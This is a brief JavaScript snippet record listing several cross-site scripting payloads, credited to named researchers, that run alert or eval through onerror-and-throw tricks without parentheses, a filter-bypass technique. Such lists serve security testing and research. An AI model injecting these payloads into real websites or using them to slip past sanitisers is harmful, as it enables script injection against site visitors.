---
id: f34cd942-1e12-410c-864f-375c560f8d0b
type: code
language: JavaScript
verified: false
created_at: '2023-04-06T03:56:42.556328+00:00'
updated_at: '2023-04-10T20:21:31.907097+00:00'
---

# Code Snippet f34cd942

**Language**: JavaScript

```javascript
// From @garethheyes
<script>onerror=alert;throw 1337</script>
<script>{onerror=alert}throw 1337</script>
<script>throw onerror=alert,'some string',123,'haha'</script>

// From @terjanq
<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>

// From @cgvwzq
<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
```
